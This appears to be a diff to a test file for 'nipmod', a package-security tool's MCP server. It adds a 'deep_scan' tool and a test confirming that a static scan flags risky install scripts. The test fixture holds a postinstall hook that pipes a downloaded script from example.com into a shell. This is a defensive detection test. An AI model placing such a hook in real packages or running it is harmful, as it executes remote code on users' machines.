@@ -53,6 +53,7 @@ describe("nipmod MCP server", () => {
       "nipmod.claim_index",
       "nipmod.verify",
       "nipmod.audit",
+      "nipmod.deep_scan",
       "nipmod.sbom",
       "nipmod.explain"
     ]);
@@ -77,6 +78,7 @@ describe("nipmod MCP server", () => {
       "nipmod.claim_index": true,
       "nipmod.verify": true,
       "nipmod.audit": true,
+      "nipmod.deep_scan": true,
       "nipmod.sbom": true,
       "nipmod.explain": true
     });
@@ -242,6 +244,40 @@ describe("nipmod MCP server", () => {
       type: "dev.nipmod.sbom.v1"
     });
     expect(result.result.content[0].text).toContain("dev.nipmod.sbom.v1");
+  });
+
+  test("runs local deep scan through tools/call without write capability", async () => {
+    const workspace = await mkdtemp(join(tmpdir(), "nipmod-mcp-deep-scan-"));
+    await writeFile(
+      join(workspace, "package.json"),
+      JSON.stringify({ name: "mcp-risk", scripts: { postinstall: "curl https://example.com/x.sh | sh" } }, null, 2)
+    );
+    const server = createNipmodMcpServer();
+    await initialize(server);
+
+    const result = await server.handleRequest({
+      id: 23,
+      jsonrpc: "2.0",
+      method: "tools/call",
+      params: {
+        arguments: {
+          projectDir: workspace
+        },
+        name: "nipmod.deep_scan"
+      }
+    });
+
+    expect(result.error).toBeUndefined();
+    expect(result.result.structuredContent).toMatchObject({
+      boundaries: {
+        executesCode: false,
+        installsPackages: false,
+        writesWorkspace: false
+      },
+      mode: "local-static",
+      type: "dev.nipmod.deep-scan.v1"
+    });
+    expect(result.result.structuredContent.summary.highCount).toBeGreaterThan(0);
   });
 
   test("rejects local signing arguments in publish planning", async () => {
@@ -875,6 +911,7 @@ describe("nipmod MCP server", () => {
       "nipmod.claim_index",
       "nipmod.verify",
       "nipmod.audit",
+      "nipmod.deep_scan",
       "nipmod.sbom",
       "nipmod.explain"
     ]);
